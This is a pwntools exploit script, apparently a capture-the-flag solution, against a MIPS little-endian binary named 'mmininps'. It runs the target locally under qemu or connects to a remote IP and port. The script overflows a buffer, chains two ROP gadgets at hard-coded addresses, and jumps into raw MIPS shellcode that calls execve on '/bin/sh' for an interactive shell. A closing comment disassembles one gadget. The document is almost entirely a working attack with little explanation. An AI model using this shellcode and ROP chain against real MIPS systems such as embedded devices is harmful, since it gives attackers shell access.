#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch="mips", endian='el', os="linux")
# context.log_level="debug"
if debug == 1:
    p = process(['qemu-mipsel', '-g', '12341', '-L', '/usr/mipsel-linux-gnu/', './mmininps'])
elif debug == 2:
    p = process(['qemu-mipsel', '-L', '/usr/mipsel-linux-gnu/', './mmininps'])
else:
    p = remote('139.9.133.160', 10000)
rop_1 = 0x409144
rop_move_t9_v0_jr_t9 = 0x405E54

sc1 = '\x0f\x00\x00\x10'  # b 相应的栈地址
sc1 += asm('''
move $ra, $sp
jr $ra
''')
sc2 = '\x62\x69\x09\x3c\x2f\x2f\x29\x35\xf4\xff\xa9\xaf\x73\x68\x09\x3c'\
      '\x6e\x2f\x29\x35\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27'\
      '\x20\x20\xa0\x03\xfc\xff\xa0\xaf\xfc\xff\xbd\x27\xff\xff\x06\x28'\
      '\xfc\xff\xa6\xaf\xfc\xff\xbd\x23\x20\x30\xa0\x03\x73\x68\x09\x34'\
      '\xfc\xff\xa9\xaf\xfc\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf'\
      '\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xbd\x00'\
      '\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xab\x0f\x02\x34'\
      '\x0c\x01\x01\x01'
pd = sc1
pd = pd.ljust(0x1c, 'a')
pd += p32(rop_1)
pd = pd.ljust(0x3c, 'b')
pd += p32(rop_move_t9_v0_jr_t9)
pd += sc2
p.send(pd)
p.interactive()

'''
rop1:
0x409144    move   $s0, $a1
0x409148    lw     $ra, 0x1c($sp)
0x40914c    move   $v0, $s0
0x409150    lw     $s0, 0x18($sp)
0x409154    jr     $ra
'''